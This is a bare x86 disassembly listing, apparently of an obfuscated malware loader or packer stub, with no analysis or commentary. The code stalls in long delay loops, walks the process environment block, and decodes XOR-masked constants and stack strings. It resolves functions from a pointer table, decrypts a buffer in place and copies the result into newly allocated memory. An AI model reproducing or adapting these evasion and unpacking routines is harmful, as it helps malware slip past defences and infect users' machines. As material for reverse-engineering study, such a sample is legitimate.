  425c12:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  425c19:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  425c20:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  425c27:	push   0x25
  425c29:	pop    ecx
  425c2a:	mov    DWORD PTR [ebp-0x30],ecx
  425c2d:	mov    DWORD PTR [ebp-0x30],ecx
  425c30:	push   0x65
  425c32:	pop    ecx
  425c33:	mov    DWORD PTR [ebp-0x30],ecx
  425c36:	mov    DWORD PTR [ebp-0x30],ecx
  425c39:	mov    DWORD PTR [ebp-0x30],0x4d
  425c40:	mov    DWORD PTR [ebp-0x30],0x43
  425c47:	mov    ecx,DWORD PTR [ebp-0x10]
  425c4a:	xor    ecx,ebx
  425c4c:	add    ecx,eax
  425c4e:	mov    DWORD PTR [ebp-0x30],ecx
  425c51:	mov    ecx,DWORD PTR [ebp-0x10]
  425c54:	xor    ecx,ebx
  425c56:	add    ecx,eax
  425c58:	mov    DWORD PTR [ebp-0x30],ecx
  425c5b:	mov    DWORD PTR [ebp-0x28],0x258
  425c62:	mov    DWORD PTR [ebp-0x34],0x36
  425c69:	mov    DWORD PTR [ebp-0x14],0x7a
  425c70:	lea    edi,[ebp-0x10c]
  425c76:	lea    esi,[ebp-0x12c]
  425c7c:	call   0x42693b
  425c81:	dec    DWORD PTR [ebp-0x14]
  425c84:	jne    0x425c70
  425c86:	dec    DWORD PTR [ebp-0x34]
  425c89:	jne    0x425c69
  425c8b:	dec    DWORD PTR [ebp-0x28]
  425c8e:	jne    0x425c62
  425c90:	mov    DWORD PTR [ebp-0x28],0x400e
  425c97:	mov    eax,DWORD PTR [ebp-0x10]
  425c9a:	xor    eax,ebx
  425c9c:	mov    esi,0x3272f1
  425ca1:	add    eax,esi
  425ca3:	mov    DWORD PTR [ebp-0x1c],eax
  425ca6:	mov    eax,DWORD PTR [ebp-0x10]
  425ca9:	and    DWORD PTR [ebp-0x94],0x0
  425cb0:	xor    eax,ebx
  425cb2:	add    eax,esi
  425cb4:	mov    DWORD PTR [ebp-0x38],eax
  425cb7:	mov    eax,fs:0x18
  425cbd:	mov    DWORD PTR [ebp-0x94],eax
  425cc3:	mov    eax,DWORD PTR [eax+0x30]
  425cc6:	mov    DWORD PTR [ebp-0xcc],eax
  425ccc:	mov    eax,DWORD PTR [eax+0xc]
  425ccf:	mov    DWORD PTR [ebp-0xc0],eax
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	lea    ecx,[ebp-0x94]
  425cde:	mov    DWORD PTR [eax+0x1a0],ecx
  425ce4:	mov    eax,DWORD PTR [ebp+0x8]
  425ce7:	lea    ecx,[ebp-0xcc]
  425ced:	mov    DWORD PTR [eax+0x1a4],ecx
  425cf3:	mov    eax,DWORD PTR [ebp+0x8]
  425cf6:	push   DWORD PTR [ebp+0x8]
  425cf9:	lea    ecx,[ebp-0xc0]
  425cff:	mov    DWORD PTR [eax+0x1a8],ecx
  425d05:	call   0x4280fc
  425d0a:	mov    ecx,DWORD PTR [ebp-0x10]
  425d0d:	xor    ecx,ebx
  425d0f:	add    ecx,esi
  425d11:	cmp    ecx,eax
  425d13:	je     0x426096
  425d19:	mov    eax,DWORD PTR [ebp+0x8]
  425d1c:	mov    eax,DWORD PTR [eax+0x194]
  425d22:	mov    ecx,DWORD PTR [eax]
  425d24:	mov    eax,DWORD PTR [ebp+0x8]
  425d27:	mov    eax,DWORD PTR [eax+0x194]
  425d2d:	mov    eax,DWORD PTR [eax]
  425d2f:	add    eax,DWORD PTR [ecx+0x3c]
  425d32:	mov    ecx,DWORD PTR [ebp+0x8]
  425d35:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425d3b:	lea    edx,[ebp-0xec]
  425d41:	push   edx
  425d42:	mov    edx,DWORD PTR [ebp+0x8]
  425d45:	mov    edx,DWORD PTR [edx+0x18c]
  425d4b:	mov    edx,DWORD PTR [edx]
  425d4d:	add    edx,DWORD PTR [eax+0x88]
  425d53:	push   0x4
  425d55:	push   DWORD PTR [eax+0x8c]
  425d5b:	push   edx
  425d5c:	call   DWORD PTR [ecx+0x1c]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	xor    eax,eax
  425d64:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e34
  425d6e:	mov    DWORD PTR [ebp-0xa4],0x12370d1c
  425d78:	mov    DWORD PTR [ebp-0xa0],0x3c0d180a
  425d82:	mov    BYTE PTR [ebp-0x9c],0x83
  425d89:	lea    edi,[ebp-0x9b]
  425d8f:	stos   DWORD PTR es:[edi],eax
  425d90:	stos   WORD PTR es:[edi],ax
  425d92:	stos   BYTE PTR es:[edi],al
  425d93:	xor    eax,eax
  425d95:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e34
  425d9f:	mov    DWORD PTR [ebp-0xb8],0x12370d1c
  425da9:	mov    DWORD PTR [ebp-0xb4],0x2a0d180a
  425db3:	mov    BYTE PTR [ebp-0xb0],0x83
  425dba:	lea    edi,[ebp-0xaf]
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	stos   WORD PTR es:[edi],ax
  425dc3:	stos   BYTE PTR es:[edi],al
  425dc4:	mov    edi,DWORD PTR [ebp+0x8]
  425dc7:	mov    eax,DWORD PTR [ebp+0x8]
  425dca:	mov    edx,DWORD PTR [eax+0x1b8]
  425dd0:	mov    DWORD PTR [ebp-0x68],0xd0f0e17
  425dd7:	mov    DWORD PTR [ebp-0x64],0x1413101e
  425dde:	mov    WORD PTR [ebp-0x60],0x833c
  425de4:	mov    DWORD PTR [ebp-0x90],0x1b3e0e34
  425dee:	mov    DWORD PTR [ebp-0x8c],0x173c0d1c
  425df8:	mov    DWORD PTR [ebp-0x88],0x311c1b13
  425e02:	mov    DWORD PTR [ebp-0x84],0xd181008
  425e0c:	mov    DWORD PTR [ebp-0x80],0x833c1e14
  425e13:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e34
  425e1a:	mov    DWORD PTR [ebp-0x78],0x173c0d1c
  425e21:	mov    DWORD PTR [ebp-0x74],0x311c1b13
  425e28:	mov    DWORD PTR [ebp-0x70],0xd181008
  425e2f:	mov    DWORD PTR [ebp-0x6c],0x832a1e14
  425e36:	call   0x42812b
  425e3b:	push   eax
  425e3c:	mov    eax,DWORD PTR [ebp+0x8]
  425e3f:	mov    eax,DWORD PTR [eax+0x1a8]
  425e45:	push   DWORD PTR [eax]
  425e47:	call   0x427dcc
  425e4c:	test   eax,eax
  425e4e:	jne    0x425ea0
  425e50:	mov    eax,DWORD PTR [ebp+0x8]
  425e53:	mov    eax,DWORD PTR [eax+0x1e0]
  425e59:	mov    edi,DWORD PTR [ebp+0x8]
  425e5c:	add    eax,0x4
  425e5f:	mov    DWORD PTR [ebp-0x20],eax
  425e62:	mov    eax,DWORD PTR [ebp+0x8]
  425e65:	mov    edx,DWORD PTR [eax+0x1b8]
  425e6b:	call   0x42812b
  425e70:	push   eax
  425e71:	mov    eax,DWORD PTR [ebp-0x20]
  425e74:	call   DWORD PTR [eax]
  425e76:	test   eax,eax
  425e78:	jne    0x425ea0
  425e7a:	mov    eax,DWORD PTR [ebp+0x8]
  425e7d:	mov    eax,DWORD PTR [eax+0x1e0]
  425e83:	mov    edi,DWORD PTR [ebp+0x8]
  425e86:	add    eax,0x10
  425e89:	mov    DWORD PTR [ebp-0x20],eax
  425e8c:	mov    eax,DWORD PTR [ebp+0x8]
  425e8f:	mov    edx,DWORD PTR [eax+0x1b8]
  425e95:	call   0x42812b
  425e9a:	push   eax
  425e9b:	mov    eax,DWORD PTR [ebp-0x20]
  425e9e:	call   DWORD PTR [eax]
  425ea0:	mov    eax,DWORD PTR [ebp-0x10]
  425ea3:	mov    ecx,DWORD PTR [ebp-0x28]
  425ea6:	xor    eax,ebx
  425ea8:	add    eax,esi
  425eaa:	cmp    eax,ecx
  425eac:	je     0x42606f
  425eb2:	mov    eax,DWORD PTR [ebp-0x18]
  425eb5:	xor    eax,ebx
  425eb7:	mov    ecx,0xffcd8d0f
  425ebc:	sub    ecx,eax
  425ebe:	add    ecx,DWORD PTR [ebp-0x28]
  425ec1:	mov    eax,DWORD PTR [ebp-0x1c]
  425ec4:	cmp    eax,ecx
  425ec6:	ja     0x42606f
  425ecc:	mov    DWORD PTR [ebp-0x34],0x0
  425ed3:	push   DWORD PTR [ebp+0x8]
  425ed6:	mov    edi,DWORD PTR [ebp+0x8]
  425ed9:	mov    eax,DWORD PTR [ebp+0x8]
  425edc:	mov    edx,DWORD PTR [eax+0x1b4]
  425ee2:	call   0x42812b
  425ee7:	push   eax
  425ee8:	mov    eax,DWORD PTR [ebp+0x8]
  425eeb:	mov    eax,DWORD PTR [eax+0x1a8]
  425ef1:	push   DWORD PTR [eax]
  425ef3:	call   0x427dcc
  425ef8:	mov    ecx,DWORD PTR [ebp+0x8]
  425efb:	mov    ecx,DWORD PTR [ecx+0x19c]
  425f01:	mov    DWORD PTR [ecx],eax
  425f03:	mov    eax,DWORD PTR [ebp+0x8]
  425f06:	mov    edi,DWORD PTR [eax+0x1e0]
  425f0c:	mov    esi,DWORD PTR [ebp+0x8]
  425f0f:	xor    eax,eax
  425f11:	lea    edx,[ebp-0x7c]
  425f14:	call   0x428161
  425f19:	push   eax
  425f1a:	mov    eax,DWORD PTR [ebp+0x8]
  425f1d:	mov    eax,DWORD PTR [eax+0x19c]
  425f23:	push   DWORD PTR [eax]
  425f25:	call   DWORD PTR [edi+0x8]
  425f28:	mov    DWORD PTR [ebp-0x20],eax
  425f2b:	mov    eax,DWORD PTR [ebp+0x8]
  425f2e:	mov    edi,DWORD PTR [eax+0x1e0]
  425f34:	mov    esi,DWORD PTR [ebp+0x8]
  425f37:	xor    eax,eax
  425f39:	lea    edx,[ebp-0x90]
  425f3f:	call   0x428161
  425f44:	push   eax
  425f45:	mov    eax,DWORD PTR [ebp+0x8]
  425f48:	mov    eax,DWORD PTR [eax+0x19c]
  425f4e:	push   DWORD PTR [eax]
  425f50:	call   DWORD PTR [edi+0x8]
  425f53:	mov    eax,DWORD PTR [ebp+0x8]
  425f56:	mov    edi,DWORD PTR [eax+0x1e0]
  425f5c:	mov    esi,DWORD PTR [ebp+0x8]
  425f5f:	xor    eax,eax
  425f61:	lea    edx,[ebp-0xa8]
  425f67:	call   0x428161
  425f6c:	push   eax
  425f6d:	mov    eax,DWORD PTR [ebp+0x8]
  425f70:	mov    eax,DWORD PTR [eax+0x19c]
  425f76:	push   DWORD PTR [eax]
  425f78:	call   DWORD PTR [edi+0x8]
  425f7b:	and    DWORD PTR [ebp-0x8],0x0
  425f7f:	mov    DWORD PTR [ebp-0x48],eax
  425f82:	mov    eax,DWORD PTR [ebp-0x8]
  425f85:	and    eax,0x7
  425f88:	add    eax,0x31
  425f8b:	push   eax
  425f8c:	call   DWORD PTR [ebp-0x20]
  425f8f:	test   eax,eax
  425f91:	je     0x425fd5
  425f93:	mov    eax,DWORD PTR [ebp-0x8]
  425f96:	push   0x19
  425f98:	xor    edx,edx
  425f9a:	pop    ecx
  425f9b:	div    ecx
  425f9d:	add    dl,0x41
  425fa0:	movzx  eax,dl
  425fa3:	push   eax
  425fa4:	call   DWORD PTR [ebp-0x48]
  425fa7:	test   eax,eax
  425fa9:	jne    0x425fd5
  425fab:	mov    eax,DWORD PTR [ebp+0x8]
  425fae:	mov    edi,DWORD PTR [eax+0x1e0]
  425fb4:	mov    esi,DWORD PTR [ebp+0x8]
  425fb7:	xor    eax,eax
  425fb9:	lea    edx,[ebp-0x68]
  425fbc:	call   0x428161
  425fc1:	push   eax
  425fc2:	mov    eax,DWORD PTR [ebp+0x8]
  425fc5:	mov    eax,DWORD PTR [eax+0x198]
  425fcb:	push   DWORD PTR [eax]
  425fcd:	call   DWORD PTR [edi+0x8]
  425fd0:	mov    DWORD PTR [ebp-0x14],eax
  425fd3:	jmp    0x425fd9
  425fd5:	and    DWORD PTR [ebp-0x14],0x0
  425fd9:	inc    DWORD PTR [ebp-0x8]
  425fdc:	cmp    DWORD PTR [ebp-0x8],0x10
  425fe0:	jb     0x425f82
  425fe2:	mov    eax,DWORD PTR [ebp-0x18]
  425fe5:	mov    esi,DWORD PTR [ebp+0x8]
  425fe8:	xor    eax,ebx
  425fea:	mov    edi,0x3272f1
  425fef:	add    eax,edi
  425ff1:	lea    edx,[ebp-0x10c]
  425ff7:	call   0x428161
  425ffc:	push   eax
  425ffd:	mov    eax,DWORD PTR [ebp-0x10]
  426000:	mov    esi,DWORD PTR [ebp+0x8]
  426003:	xor    eax,ebx
  426005:	add    eax,edi
  426007:	lea    edx,[ebp-0x12c]
  42600d:	call   0x428161
  426012:	push   eax
  426013:	call   DWORD PTR [ebp-0x14]
  426016:	mov    ecx,DWORD PTR [ebp-0x10]
  426019:	xor    ecx,ebx
  42601b:	add    ecx,edi
  42601d:	cmp    ecx,eax
  42601f:	jne    0x426028
  426021:	mov    DWORD PTR [ebp-0x34],0x1
  426028:	mov    eax,DWORD PTR [ebp-0x18]
  42602b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42602e:	xor    eax,ebx
  426030:	lea    eax,[eax+ecx*1+0x3272f1]
  426037:	mov    DWORD PTR [ebp-0x1c],eax
  42603a:	mov    eax,DWORD PTR [ebp-0x34]
  42603d:	test   eax,eax
  42603f:	je     0x426053
  426041:	mov    eax,DWORD PTR [ebp-0x18]
  426044:	mov    ecx,DWORD PTR [ebp-0x38]
  426047:	xor    eax,ebx
  426049:	lea    eax,[eax+ecx*1+0x3272f1]
  426050:	mov    DWORD PTR [ebp-0x38],eax
  426053:	mov    eax,DWORD PTR [ebp-0x18]
  426056:	xor    eax,ebx
  426058:	mov    ecx,0xffcd8d0f
  42605d:	sub    ecx,eax
  42605f:	add    ecx,DWORD PTR [ebp-0x28]
  426062:	mov    eax,DWORD PTR [ebp-0x1c]
  426065:	cmp    eax,ecx
  426067:	jbe    0x425ecc
  42606d:	mov    esi,edi
  42606f:	mov    eax,DWORD PTR [ebp-0x38]
  426072:	mov    ecx,DWORD PTR [ebp-0x1c]
  426075:	cmp    ecx,eax
  426077:	jne    0x42608a
  426079:	push   DWORD PTR [ebp+0x8]
  42607c:	lea    eax,[ebp-0x40]
  42607f:	push   eax
  426080:	call   0x428bce
  426085:	mov    DWORD PTR [ebp-0x24],eax
  426088:	jmp    0x426096
  42608a:	mov    eax,DWORD PTR [ebp-0x24]
  42608d:	mov    ecx,DWORD PTR [ebp-0x18]
  426090:	xor    ecx,ebx
  426092:	add    ecx,esi
  426094:	xor    DWORD PTR [eax],ecx
  426096:	mov    eax,DWORD PTR [ebp-0x10]
  426099:	mov    ecx,DWORD PTR [ebp-0x24]
  42609c:	xor    eax,ebx
  42609e:	add    eax,esi
  4260a0:	cmp    eax,ecx
  4260a2:	je     0x426819
  4260a8:	mov    eax,DWORD PTR [ebp-0x10]
  4260ab:	mov    ecx,DWORD PTR [ebp-0x40]
  4260ae:	xor    eax,ebx
  4260b0:	add    eax,esi
  4260b2:	cmp    eax,ecx
  4260b4:	je     0x426819
  4260ba:	mov    eax,DWORD PTR [ebp-0x10]
  4260bd:	xor    eax,ebx
  4260bf:	add    eax,esi
  4260c1:	jmp    0x4260df
  4260c3:	mov    edi,DWORD PTR [ebp-0x24]
  4260c6:	mov    cl,al
  4260c8:	and    cl,0x1f
  4260cb:	or     dl,0xff
  4260ce:	sub    dl,cl
  4260d0:	add    BYTE PTR [edi+eax*1],dl
  4260d3:	mov    ecx,DWORD PTR [ebp-0x18]
  4260d6:	xor    ecx,ebx
  4260d8:	lea    eax,[eax+ecx*1+0x3272f1]
  4260df:	mov    ecx,DWORD PTR [ebp-0x40]
  4260e2:	cmp    eax,ecx
  4260e4:	jb     0x4260c3
  4260e6:	mov    eax,DWORD PTR [ebp-0x40]
  4260e9:	mov    DWORD PTR [ebp-0x28],eax
  4260ec:	mov    eax,DWORD PTR [ebp-0x24]
  4260ef:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  4260f6:	mov    DWORD PTR [ebp-0xd4],eax
  4260fc:	mov    edi,0xf89c85ba
  426101:	mov    DWORD PTR [ebp-0x2c],edi
  426104:	mov    eax,DWORD PTR [ebp-0x38]
  426107:	xor    eax,ebx
  426109:	add    eax,esi
  42610b:	mov    DWORD PTR [ebp-0xc],eax
  42610e:	mov    eax,DWORD PTR [ebp-0x38]
  426111:	xor    eax,ebx
  426113:	add    eax,esi
  426115:	mov    DWORD PTR [ebp-0x8],eax
  426118:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  42611f:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  426126:	mov    eax,DWORD PTR [ebp-0x38]
  426129:	mov    ecx,DWORD PTR [ebp-0x28]
  42612c:	xor    eax,ebx
  42612e:	add    eax,esi
  426130:	cmp    ecx,eax
  426132:	je     0x426331
  426138:	jmp    0x42630d
  42613d:	mov    ecx,DWORD PTR [ebp-0xc]
  426140:	mov    eax,DWORD PTR [ebp-0x28]
  426143:	sub    eax,ecx
  426145:	mov    ecx,DWORD PTR [ebp-0x48]
  426148:	xor    ecx,ebx
  42614a:	add    ecx,esi
  42614c:	xor    edx,edx
  42614e:	div    ecx
  426150:	mov    DWORD PTR [ebp-0x8],eax
  426153:	mov    eax,DWORD PTR [ebp-0x4c]
  426156:	mov    ecx,DWORD PTR [ebp-0x8]
  426159:	xor    eax,ebx
  42615b:	add    eax,esi
  42615d:	cmp    ecx,eax
  42615f:	jbe    0x42616b
  426161:	mov    eax,DWORD PTR [ebp-0x4c]
  426164:	xor    eax,ebx
  426166:	add    eax,esi
  426168:	mov    DWORD PTR [ebp-0x8],eax
  42616b:	mov    eax,DWORD PTR [ebp-0x48]
  42616e:	mov    ecx,DWORD PTR [ebp-0x8]
  426171:	xor    eax,ebx
  426173:	add    eax,esi
  426175:	imul   eax,ecx
  426178:	mov    DWORD PTR [ebp-0x8],eax
  42617b:	mov    eax,DWORD PTR [ebp-0x38]
  42617e:	mov    ecx,DWORD PTR [ebp-0x8]
  426181:	xor    eax,ebx
  426183:	add    eax,esi
  426185:	cmp    ecx,eax
  426187:	je     0x4262fb
  42618d:	mov    eax,DWORD PTR [ebp-0x8]
  426190:	mov    DWORD PTR [ebp-0x14],eax
  426193:	mov    eax,DWORD PTR [ebp-0xc]
  426196:	add    eax,DWORD PTR [ebp-0xd4]
  42619c:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  4261a3:	mov    DWORD PTR [ebp-0x34],edi
  4261a6:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  4261b0:	mov    DWORD PTR [ebp-0x8],eax
  4261b3:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  4261ba:	mov    DWORD PTR [ebp-0x1c],edi
  4261bd:	mov    eax,DWORD PTR [ebp-0x20]
  4261c0:	xor    eax,ebx
  4261c2:	add    eax,esi
  4261c4:	jmp    0x4262ba
  4261c9:	mov    DWORD PTR [ebp-0xe0],0xf89c85b0
  4261d3:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  4261dd:	mov    eax,DWORD PTR [ebp-0x1c]
  4261e0:	mov    ecx,DWORD PTR [ebp-0x44]
  4261e3:	xor    eax,ebx
  4261e5:	add    eax,esi
  4261e7:	imul   eax,ecx
  4261ea:	mov    ecx,DWORD PTR [ebp-0x8]
  4261ed:	mov    al,BYTE PTR [eax+ecx*1]
  4261f0:	mov    BYTE PTR [ebp-0x2],al
  4261f3:	mov    eax,DWORD PTR [ebp-0x1c]
  4261f6:	mov    ecx,DWORD PTR [ebp-0x44]
  4261f9:	xor    eax,ebx
  4261fb:	add    eax,esi
  4261fd:	imul   eax,ecx
  426200:	mov    ecx,DWORD PTR [ebp-0xe8]
  426206:	xor    ecx,ebx
  426208:	add    eax,ecx
  42620a:	mov    ecx,DWORD PTR [ebp-0x8]
  42620d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426215:	mov    ecx,DWORD PTR [ebp-0xe0]
  42621b:	xor    ecx,ebx
  42621d:	lea    eax,[ecx+eax*1+0x3272f1]
  426224:	movzx  ecx,BYTE PTR [ebp-0x2]
  426228:	xor    ecx,eax
  42622a:	mov    BYTE PTR [ebp-0x2],cl
  42622d:	mov    al,BYTE PTR [ebp-0x2]
  426230:	mov    ecx,DWORD PTR [ebp-0x1c]
  426233:	mov    edx,DWORD PTR [ebp-0x44]
  426236:	xor    ecx,ebx
  426238:	add    ecx,esi
  42623a:	imul   ecx,edx
  42623d:	mov    edx,DWORD PTR [ebp-0x8]
  426240:	mov    BYTE PTR [ecx+edx*1],al
  426243:	mov    eax,DWORD PTR [ebp-0x1c]
  426246:	mov    ecx,DWORD PTR [ebp-0x44]
  426249:	xor    eax,ebx
  42624b:	add    eax,esi
  42624d:	imul   eax,ecx
  426250:	mov    ecx,DWORD PTR [ebp-0x8]
  426253:	mov    al,BYTE PTR [eax+ecx*1]
  426256:	mov    BYTE PTR [ebp-0x2],al
  426259:	mov    eax,DWORD PTR [ebp-0x1c]
  42625c:	mov    ecx,DWORD PTR [ebp-0x44]
  42625f:	xor    eax,ebx
  426261:	add    eax,esi
  426263:	imul   eax,ecx
  426266:	mov    ecx,DWORD PTR [ebp-0x34]
  426269:	xor    ecx,ebx
  42626b:	add    eax,ecx
  42626d:	mov    ecx,DWORD PTR [ebp-0x8]
  426270:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426278:	mov    ecx,DWORD PTR [ebp-0xc4]
  42627e:	xor    ecx,ebx
  426280:	lea    eax,[ecx+eax*1+0x3272f1]
  426287:	movzx  ecx,BYTE PTR [ebp-0x2]
  42628b:	xor    ecx,eax
  42628d:	mov    BYTE PTR [ebp-0x2],cl
  426290:	mov    al,BYTE PTR [ebp-0x2]
  426293:	mov    ecx,DWORD PTR [ebp-0x1c]
  426296:	mov    edx,DWORD PTR [ebp-0x44]
  426299:	xor    ecx,ebx
  42629b:	add    ecx,esi
  42629d:	imul   ecx,edx
  4262a0:	mov    edx,DWORD PTR [ebp-0x8]
  4262a3:	mov    BYTE PTR [ecx+edx*1],al
  4262a6:	mov    eax,DWORD PTR [ebp-0x30]
  4262a9:	mov    ecx,DWORD PTR [ebp-0x34]
  4262ac:	xor    eax,ebx
  4262ae:	xor    ecx,ebx
  4262b0:	add    eax,esi
  4262b2:	add    ecx,esi
  4262b4:	imul   eax,ecx
  4262b7:	add    eax,DWORD PTR [ebp-0x44]
  4262ba:	mov    DWORD PTR [ebp-0x44],eax
  4262bd:	mov    eax,DWORD PTR [ebp-0x44]
  4262c0:	mov    ecx,DWORD PTR [ebp-0x14]
  4262c3:	cmp    ecx,eax
  4262c5:	jb     0x4261c9
  4262cb:	mov    eax,DWORD PTR [ebp-0x34]
  4262ce:	mov    ecx,DWORD PTR [ebp-0x14]
  4262d1:	xor    eax,ebx
  4262d3:	add    eax,esi
  4262d5:	imul   eax,ecx
  4262d8:	mov    ecx,DWORD PTR [ebp-0x20]
  4262db:	xor    ecx,ebx
  4262dd:	add    ecx,esi
  4262df:	or     eax,ecx
  4262e1:	mov    ecx,DWORD PTR [ebp-0x2c]
  4262e4:	xor    ecx,ebx
  4262e6:	add    eax,ecx
  4262e8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4262eb:	xor    ecx,ebx
  4262ed:	add    eax,ecx
  4262ef:	mov    ecx,DWORD PTR [ebp-0xc]
  4262f2:	lea    eax,[eax+ecx*1+0x64e5e2]
  4262f9:	jmp    0x42630a
  4262fb:	mov    eax,DWORD PTR [ebp-0x2c]
  4262fe:	mov    ecx,DWORD PTR [ebp-0xc]
  426301:	xor    eax,ebx
  426303:	lea    eax,[eax+ecx*1+0x3272f1]
  42630a:	mov    DWORD PTR [ebp-0xc],eax
  42630d:	mov    eax,DWORD PTR [ebp-0x2c]
  426310:	xor    eax,ebx
  426312:	mov    ecx,0xffcd8d0f
  426317:	sub    ecx,eax
  426319:	add    ecx,DWORD PTR [ebp-0x28]
  42631c:	mov    eax,DWORD PTR [ebp-0x2c]
  42631f:	mov    edx,DWORD PTR [ebp-0xc]
  426322:	xor    eax,ebx
  426324:	add    eax,esi
  426326:	imul   eax,edx
  426329:	cmp    eax,ecx
  42632b:	jbe    0x42613d
  426331:	mov    eax,DWORD PTR [ebp-0x10]
  426334:	mov    ecx,DWORD PTR [ebp-0x40]
  426337:	mov    eax,DWORD PTR [ebp+0x8]
  42633a:	mov    edx,DWORD PTR [ebp-0x54]
  42633d:	mov    eax,DWORD PTR [eax+0x1e0]
  426343:	xor    edx,ebx
  426345:	add    edx,esi
  426347:	push   edx
  426348:	mov    edx,DWORD PTR [ebp-0x3c]
  42634b:	xor    edx,ebx
  42634d:	add    edx,esi
  42634f:	push   edx
  426350:	push   ecx
  426351:	mov    DWORD PTR [ebp-0x30],ecx
  426354:	mov    ecx,DWORD PTR [ebp-0x10]
  426357:	xor    ecx,ebx
  426359:	add    ecx,esi
  42635b:	push   ecx
  42635c:	call   DWORD PTR [eax+0x14]
  42635f:	mov    edi,eax
  426361:	mov    eax,DWORD PTR [ebp-0x10]
  426364:	xor    eax,ebx
  426366:	add    eax,esi
  426368:	cmp    eax,edi
  42636a:	je     0x4263c5
  42636c:	mov    eax,DWORD PTR [ebp-0x10]
  42636f:	jmp    0x426392
  426371:	mov    ecx,DWORD PTR [ebp-0x24]
  426374:	xor    eax,ebx
  426376:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f1]
  42637d:	mov    BYTE PTR [eax+edi*1+0x3272f1],cl
  426384:	mov    ecx,DWORD PTR [ebp-0x18]
  426387:	xor    ecx,ebx
  426389:	lea    eax,[ecx+eax*1+0x3272f1]
  426390:	xor    eax,ebx
  426392:	mov    ecx,DWORD PTR [ebp-0x40]
  426395:	sub    ecx,esi
  426397:	xor    ecx,ebx
  426399:	cmp    eax,ecx
  42639b:	jne    0x426371
  42639d:	mov    eax,DWORD PTR [ebp+0x8]
  4263a0:	mov    ecx,DWORD PTR [ebp-0x50]
  4263a3:	mov    eax,DWORD PTR [eax+0x1e0]
  4263a9:	xor    ecx,ebx
  4263ab:	add    ecx,esi
  4263ad:	push   ecx
  4263ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4263b1:	xor    ecx,ebx
  4263b3:	add    ecx,esi
  4263b5:	push   ecx
  4263b6:	push   DWORD PTR [ebp-0x24]
  4263b9:	call   DWORD PTR [eax+0x18]
  4263bc:	mov    eax,DWORD PTR [ebp-0x30]
  4263bf:	mov    DWORD PTR [ebp-0x24],edi
  4263c2:	mov    DWORD PTR [ebp-0x40],eax
  4263c5:	mov    edi,DWORD PTR [ebp-0x24]
  4263c8:	mov    eax,DWORD PTR [ebp-0x18]
  4263cb:	mov    ecx,DWORD PTR [ebp-0x10]
  4263ce:	xor    eax,ebx
  4263d0:	mov    DWORD PTR [ebp-0x30],edi
  4263d3:	add    eax,esi
  4263d5:	mov    DWORD PTR [ebp-0x5c],0x3c2b332b
  4263dc:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  4263e3:	jmp    0x426416
  4263e5:	xor    ecx,ebx
  4263e7:	mov    dl,BYTE PTR [ebp+ecx*1+0x327295]
  4263ee:	xor    dl,0x7c
  4263f1:	inc    dl
  4263f3:	mov    DWORD PTR [ebp-0x3c],ecx
  4263f6:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f1]
  4263fe:	movzx  edx,dl
  426401:	cmp    ecx,edx
  426403:	jne    0x426420
  426405:	mov    ecx,DWORD PTR [ebp-0x18]
  426408:	mov    edx,DWORD PTR [ebp-0x3c]
  42640b:	xor    ecx,ebx
  42640d:	lea    ecx,[ecx+edx*1+0x3272f1]
  426414:	xor    ecx,ebx
  426416:	cmp    ecx,0xf89c85bd
  42641c:	jne    0x4263e5
  42641e:	jmp    0x426427
  426420:	mov    eax,DWORD PTR [ebp-0x10]
  426423:	xor    eax,ebx
  426425:	add    eax,esi
  426427:	mov    ecx,DWORD PTR [ebp-0x10]
  42642a:	xor    ecx,ebx
  42642c:	add    ecx,esi
  42642e:	cmp    ecx,eax
  426430:	je     0x4265a3
  426436:	mov    eax,DWORD PTR [edi+0x8]
  426439:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426440:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  426447:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  42644e:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  426455:	mov    DWORD PTR [ebp-0x14],eax
  426458:	mov    eax,DWORD PTR [ebp+0x8]
  42645b:	mov    ecx,DWORD PTR [ebp-0x20]
  42645e:	xor    ecx,ebx
  426460:	add    ecx,esi
  426462:	push   ecx
  426463:	mov    ecx,DWORD PTR [ebp-0x48]
  426466:	mov    eax,DWORD PTR [eax+0x1e0]
  42646c:	xor    ecx,ebx
  42646e:	add    ecx,esi
  426470:	push   ecx
  426471:	mov    ecx,DWORD PTR [ebp-0x3c]
  426474:	xor    ecx,ebx
  426476:	add    ecx,esi
  426478:	push   ecx
  426479:	mov    ecx,DWORD PTR [ebp-0xc]
  42647c:	xor    ecx,ebx
  42647e:	add    ecx,esi
  426480:	push   ecx
  426481:	call   DWORD PTR [eax+0x14]
  426484:	mov    edi,eax
  426486:	mov    eax,DWORD PTR [ebp+0x8]
  426489:	mov    ecx,DWORD PTR [ebp-0x20]
  42648c:	mov    eax,DWORD PTR [eax+0x1e0]
  426492:	xor    ecx,ebx
  426494:	add    ecx,esi
  426496:	push   ecx
  426497:	mov    ecx,DWORD PTR [ebp-0x48]
  42649a:	xor    ecx,ebx
  42649c:	add    ecx,esi
  42649e:	push   ecx
  42649f:	mov    ecx,DWORD PTR [ebp-0xc]
  4264a2:	push   DWORD PTR [ebp-0x14]
  4264a5:	xor    ecx,ebx
